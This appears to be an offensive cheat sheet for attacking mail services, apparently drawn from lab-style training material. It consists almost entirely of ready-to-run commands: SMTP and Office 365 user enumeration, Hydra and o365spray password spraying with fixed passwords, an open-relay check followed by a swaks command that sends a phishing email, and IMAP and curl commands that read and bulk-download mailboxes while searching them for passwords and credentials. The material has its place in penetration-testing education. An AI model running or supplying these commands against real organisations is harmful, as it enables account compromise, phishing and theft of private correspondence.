#### Enumerate Mail Server via DNS MX Queries
```shell
dig mx plaintext.do | grep "MX" | grep -v ";"
```

```shell
host -t MX hackthebox.eu
```
#### Nmap all mail ports
```shell
nmap -Pn -sV -sC -p25,143,110,465,587,993,995 10.129.14.128
```
#### User Enumeration
```shell
smtp-user-enum -M VRFY -U userlist.txt -D inlanefreight.htb -t 10.129.203.7

smtp-user-enum -M RCPT -U userlist.txt -D inlanefreight.htb -t 10.129.203.7

smtp-user-enum -M EXPN -U userlist.txt -D inlanefreight.htb -t 10.129.203.7
```

## Cloud Enumeration
#### O365 Spray
```shell
python3 o365spray.py --validate --domain msplaintext.xyz
```
#### Enum Users
```shell
python3 o365spray.py --enum -U users.txt --domain msplaintext.xyz
```

## Password Attacks
We can use `Hydra` to perform a password spray or brute force against email services such as `SMTP`, `POP3`, or `IMAP4`.
#### Hydra - Password Attack
```shell
hydra -L users.txt -p 'Company01!' -f 10.10.110.20 smtp

hydra -L users.txt -p 'Company01!' -f 10.10.110.20 imap

hydra -L users.txt -p 'Company01!' -f 10.10.110.20 pop3
```
#### O365 Spray - Password Spraying
```shell
python3 o365spray.py --spray -U usersfound.txt -p 'March2022!' --count 1 --lockout 1 --domain msplaintext.xyz
```

#### Open Relay (SMTP)
Check:
```shell
nmap -p25 -Pn --script smtp-open-relay 10.10.11.213
```

Next, we can use any mail client to connect to the mail server and send our email.
```shell
swaks --from notifications@inlanefreight.com --to employees@inlanefreight.com --header 'Subject: Company Notification' --body 'Hi All, we want to hear from you! Please complete the following survey. http://mycustomphishinglink.com/' --server 10.10.11.213
```

---
#### Search and Read
```shell
# Read all emails
a1 LOGIN username password
a2 SELECT INBOX
a3 FETCH 1:* (BODY[])

# Search for specific content
a4 SEARCH SUBJECT "password"
a5 SEARCH FROM "admin@target.com"
a6 SEARCH TEXT "confidential"
```
#### Retrieve all mails
```shell
# Download all emails with curl
for i in {1..100}; do
  curl -u username:password "imap://target.com/INBOX;UID=$i" > email_$i.eml
done
```
#### Keyword Search
```shell
# Search for keywords
SEARCH TEXT "password"
SEARCH TEXT "credential"
SEARCH TEXT "confidential"
SEARCH SUBJECT "reset"
```